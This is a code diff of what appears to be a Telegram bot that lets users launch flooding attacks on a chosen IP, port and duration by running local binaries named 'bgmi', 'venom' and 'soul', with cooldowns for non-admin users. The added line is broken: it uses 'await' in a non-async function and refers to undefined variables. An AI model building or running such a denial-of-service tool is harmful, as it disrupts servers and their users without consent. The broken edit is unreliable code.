@@ -256,7 +256,7 @@ def show_user_id(message):
 def start_attack(user_id, target, port, duration):
     attack_id = f"{user_id} {target} {port}"
     bgmi_file = f"bgmi{user_id}"
-    sahil_file = f"venom{user_id}"
+    bgmi2_file = f"venom{user_id}"
     user = bot.get_chat(user_id)
     username = f"@{user.username}" if user.username else f"UserID: {user_id}"
     log_command(user_id, target, port, duration)
@@ -266,6 +266,7 @@ def start_attack(user_id, target, port, duration):
         ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200", shell=True)
         time.sleep(5)
         subprocess.run(f"./{bgmi2_file} {target} {port} {duration} 200", shell=True)
+        process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 60")
       # Set cooldown for normal users after a successful attack
         if user_id not in ADMIN_IDS:
             user_cooldowns[user_id] = datetime.datetime.now()
